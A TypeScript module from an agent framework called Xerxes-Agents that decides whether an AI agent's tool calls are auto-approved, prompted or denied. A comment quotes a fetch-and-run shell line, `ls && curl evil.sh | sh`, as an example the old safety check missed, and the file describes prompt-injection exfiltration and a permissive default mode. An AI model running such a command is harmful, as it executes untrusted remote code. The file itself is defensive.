// Copyright 2026 The Xerxes-Agents Author @erfanzar (Erfan Zare Chavoshi).
// Licensed under the Apache License, Version 2.0.

import { isReadOnlyInvocation, isReadOnlyShellCommand } from '../security/shellAnalysis.js'
import type { JsonObject, ToolCall } from '../types/toolCalls.js'
import type { PermissionRequest } from './events.js'

export type PermissionDecision = 'approve' | 'approve_for_session' | 'reject'
export type PermissionMode = 'accept-all' | 'auto' | 'manual' | 'plan'
export type PolicyAction = 'allow' | 'deny'
export type PermissionDisposition = 'allow' | 'deny' | 'prompt'

/** Xerxes starts in YOLO mode unless an embedding host explicitly chooses a stricter policy. */
export const DEFAULT_PERMISSION_MODE: PermissionMode = 'accept-all'

/**
 * Tools that always require an explicit user approval, in every permission
 * mode including the default `accept-all` (YOLO) mode.
 *
 * These calls have durable or externally visible side effects that outlive the
 * current turn: `send_message` delivers outbound channel messages and
 * attachments to third parties, `RemoteTriggerTool` fires configured webhooks,
 * and `ScheduleCronTool` persists a prompt that re-executes later. Auto-
 * approving them under YOLO would let one prompt-injected turn exfiltrate data
 * or plant persistent re-execution without the user ever seeing a prompt.
 *
 * `computer_use` is deliberately NOT in this tier: it is a documented baseline
 * desktop surface that hosts opt into explicitly, and gating it here would
 * break that contracted behavior.
 *
 * Escape hatch: an embedding host that has made a deliberate, informed decision
 * to restore legacy zero-prompt behavior may pass
 * `{ bypassAlwaysApprove: true }` (the `bypassAlwaysApprove` gate option). No
 * in-tree caller sets it, so the daemon, TUI, ACP, and API paths enforce this
 * tier unconditionally.
 */
export const ALWAYS_APPROVAL_TOOLS = new Set(['send_message', 'RemoteTriggerTool', 'ScheduleCronTool'])

export interface PermissionGateOptions {
  /**
   * Explicit host escape hatch for {@link ALWAYS_APPROVAL_TOOLS}. When true,
   * the always-approval tier is skipped and the permission mode alone decides.
   * Defaults to false; hosts must opt in consciously.
   */
  readonly bypassAlwaysApprove?: boolean
}

export interface ToolPolicy {
  check(toolName: string, agentId?: string): PolicyAction
}

export interface PermissionBroker {
  request(request: PermissionRequest, signal?: AbortSignal): Promise<PermissionDecision>
}

export const SAFE_TOOLS = new Set([
  'ReadFile', 'GlobTool', 'GrepTool', 'ListDir', 'APIClient', 'RSSReader', 'URLAnalyzer', 'DuckDuckGoSearch', 'SystemInfo',
  'skills_list', 'skill_view', 'session_search', 'search_memory', 'get_memory_statistics', 'consolidate_agent_memories',
  'agent_memory_read', 'agent_memory_list', 'agent_memory_search', 'agent_memory_status', 'TaskListTool', 'TaskGetTool',
  'TaskOutputTool', 'AwaitAgents', 'CheckAgentMessages', 'PeekAgent', 'ToolSearchTool', 'AskUserQuestionTool',
  'SetInteractionModeTool', 'JSONProcessor', 'CSVProcessor', 'TextProcessor', 'Calculator', 'StatisticalAnalyzer',
  'MathematicalFunctions', 'UnitConverter', 'DateTimeProcessor',
])

const WRITING_TOOLS = new Set(['Write', 'WriteFile', 'Edit', 'FileEditTool', 'AppendFile'])

interface DirectCommand {
  readonly args: readonly string[]
  readonly command: string
  readonly workdir: string | undefined
}

type CommandInput =
  | { readonly kind: 'argv'; readonly value: DirectCommand }
  | { readonly kind: 'shell'; readonly value: string }

/**
 * Whether a shell command is read-only enough to auto-approve.
 *
 * Delegates to {@link analyzeShellCommand}, which splits on the operators that
 * sequence independent commands and requires EVERY segment to resolve safe. The
 * previous prefix-anchored regex read `ls && curl evil.sh | sh` as safe because
 * its first command was; unresolved constructs now also fail closed.
 */
export function isSafeShellCommand(command: string): boolean {
  return isReadOnlyShellCommand(command)
}

/**
 * Resolve the static policy gate before applying the interactive permission mode.
 *
 * A policy denial is final. A policy allowance only admits the call to the
 * mode-level rules; it does not silently bypass manual approval.
 */
export function permissionDisposition(
  call: Pick<ToolCall, 'function'>,
  mode: PermissionMode = DEFAULT_PERMISSION_MODE,
  policy?: ToolPolicy,
  agentId?: string,
  options?: PermissionGateOptions,
): PermissionDisposition {
  const name = call.function.name
  if (policy?.check(name, agentId) === 'deny') {
    return 'deny'
  }
  // The always-approval tier is consulted before the mode shortcut, so these
  // tools prompt even under `accept-all`. See ALWAYS_APPROVAL_TOOLS.
  if (ALWAYS_APPROVAL_TOOLS.has(name) && options?.bypassAlwaysApprove !== true) {
    return 'prompt'
  }
  if (mode === 'accept-all') {
    return 'allow'
  }
  if (mode === 'manual') {
    return 'prompt'
  }
  if (SAFE_TOOLS.has(name)) {
    return 'allow'
  }
  const command = commandInput(name, call.function.arguments)
  if (mode === 'plan') {
    return command && isSafeCommandInput(command) ? 'allow' : 'prompt'
  }
  if (command) {
    return isSafeCommandInput(command) ? 'allow' : 'prompt'
  }
  return name === 'Agent'
    || name === 'AgentTool'
    || name === 'SendMessage'
    || name === 'SendMessageTool'
    || name === 'MemorySave'
    ? 'allow'
    : 'prompt'
}

/** Whether a call is immediately allowed; false means either prompt or hard deny. */
export function checkPermission(
  call: Pick<ToolCall, 'function'>,
  mode: PermissionMode = DEFAULT_PERMISSION_MODE,
  policy?: ToolPolicy,
  agentId?: string,
  options?: PermissionGateOptions,
): boolean {
  return permissionDisposition(call, mode, policy, agentId, options) === 'allow'
}

export function permissionDescription(call: Pick<ToolCall, 'function'>): string {
  const name = call.function.name
  const inputs = call.function.arguments
  const command = commandInput(name, inputs)
  if (command) {
    return `Run: ${command.kind === 'argv' ? formatDirectCommand(command.value) : command.value}`
  }
  if (name === 'Write' || name === 'WriteFile') {
    return `Write to: ${stringInput(inputs, 'file_path')}`
  }
  if (name === 'Edit' || name === 'FileEditTool') {
    return `Edit: ${stringInput(inputs, 'file_path')}`
  }
  if (name === 'AppendFile') {
    return `Append to: ${stringInput(inputs, 'file_path')}`
  }
  if (name === 'SpawnAgents') {
    const labels = spawnAgentLabels(inputs.agents)
    if (!labels.length) return 'Spawn agents in parallel'
    const preview = labels.slice(0, 4).join(', ')
    const remainder = labels.length > 4 ? ` +${labels.length - 4} more` : ''
    return `Spawn ${labels.length} agents in parallel: ${preview}${remainder}`
  }
  if (name === 'Agent' || name === 'AgentTool') {
    const label = stringInput(inputs, 'name') || stringInput(inputs, 'subagent_type') || 'subagent'
    const prompt = stringInput(inputs, 'prompt').trim()
    return prompt ? `Spawn agent ${label}: ${prompt.slice(0, 60)}` : `Spawn agent ${label}`
  }
  if (name === 'SendMessage' || name === 'SendMessageTool') {
    const target = stringInput(inputs, 'target').trim() || 'subagent'
    const message = stringInput(inputs, 'message').trim()
    return message ? `Message ${target}: ${message.slice(0, 60)}` : `Message ${target}`
  }
  if (name === 'computer_use') {
    const action = stringInput(inputs, 'action') || 'action'
    const app = stringInput(inputs, 'app').trim()
    const x = inputs['x']
    const y = inputs['y']
    const at = typeof x === 'number' && typeof y === 'number' ? ` at (${x}, ${y})` : ''
    const detail = app ? ` (${app})` : at
    return `Desktop: ${action}${detail}`
  }
  const firstValue = Object.values(inputs)[0]
  return `${name}(${String(firstValue ?? '').slice(0, 60)})`
}

export function deniedResult(call: ToolCall): string {
  return `Permission denied for ${call.function.name}.`
}

export function isWritingTool(name: string): boolean {
  return WRITING_TOOLS.has(name)
}

function commandInput(name: string, inputs: JsonObject): CommandInput | undefined {
  if (name === 'Bash') {
    const command = stringInput(inputs, 'command')
    return command ? { kind: 'shell', value: command } : undefined
  }
  if (name === 'exec_command') {
    return execCommandInput(inputs)
  }
  return undefined
}

function execCommandInput(inputs: JsonObject): CommandInput | undefined {
  const command = stringInput(inputs, 'cmd').trim()
  if (!command) return undefined

  const argsValue = inputs.args
  if (argsValue !== undefined) {
    if (!Array.isArray(argsValue) || !argsValue.every(value => typeof value === 'string')) return undefined
    return {
      kind: 'argv',
      value: {
        command,
        args: argsValue,
        workdir: optionalStringInput(inputs, 'workdir'),
      },
    }
  }

  // The native process tool uses a bare executable and optional argv. The PTY
  // operator uses one shell string. Preserve the shell parser whenever `cmd`
  // contains shell syntax or whitespace rather than trying to reinterpret it.
  if (/\s|[;&|`$()<>]/.test(command)) {
    return { kind: 'shell', value: command }
  }
  return {
    kind: 'argv',
    value: {
      command,
      args: [],
      workdir: optionalStringInput(inputs, 'workdir'),
    },
  }
}

function isSafeCommandInput(input: CommandInput): boolean {
  return input.kind === 'shell' ? isSafeShellCommand(input.value) : isSafeDirectCommand(input.value)
}

/**
 * The argv surface shares the shell surface's read-only allowlist and adds the
 * checks only argv can make: workspace confinement (which a shell `cd /tmp`
 * legitimately breaks) and control characters that never belong in an argument.
 */
function isSafeDirectCommand(input: DirectCommand): boolean {
  if (!/^[A-Za-z0-9._+-]+$/.test(input.command)) return false
  if (input.workdir !== undefined && isOutsideWorkspaceReference(input.workdir)) return false
  if (input.args.some(argument => hasControlCharacters(argument) || isOutsideWorkspaceReference(argument))) return false
  return isReadOnlyInvocation(input.command, input.args)
}

function isOutsideWorkspaceReference(value: string): boolean {
  const candidates = [value.trim()]
  const equals = value.indexOf('=')
  if (equals >= 0) candidates.push(value.slice(equals + 1).trim())
  return candidates.some(candidate => {
    if (!candidate) return false
    const normalized = candidate.replaceAll('\\', '/')
    return normalized.startsWith('/')
      || normalized.startsWith('~/')
      || /^[A-Za-z]:\//.test(normalized)
      || normalized.split('/').includes('..')
  })
}

function hasControlCharacters(value: string): boolean {
  return /[\u0000-\u001f\u007f]/.test(value)
}

function formatDirectCommand(input: DirectCommand): string {
  return [input.command, ...input.args].map(formatArgument).join(' ')
}

function formatArgument(value: string): string {
  return /^[A-Za-z0-9_./:=+@%,-]+$/.test(value) ? value : JSON.stringify(value)
}

function spawnAgentLabels(value: unknown): string[] {
  let agents = value
  if (typeof agents === 'string') {
    try {
      agents = JSON.parse(agents)
    } catch {
      return []
    }
  }
  if (!Array.isArray(agents)) return []
  return agents.map((agent, index) => {
    if (!agent || typeof agent !== 'object' || Array.isArray(agent)) return `agent ${index + 1}`
    const record = agent as Record<string, unknown>
    const label = typeof record.name === 'string' && record.name.trim()
      ? record.name.trim()
      : typeof record.subagent_type === 'string' && record.subagent_type.trim()
        ? record.subagent_type.trim()
        : `agent ${index + 1}`
    return label
  })
}

function stringInput(inputs: JsonObject, key: string): string {
  const value = inputs[key]
  return typeof value === 'string' ? value : ''
}

function optionalStringInput(inputs: JsonObject, key: string): string | undefined {
  const value = inputs[key]
  return typeof value === 'string' ? value : undefined
}
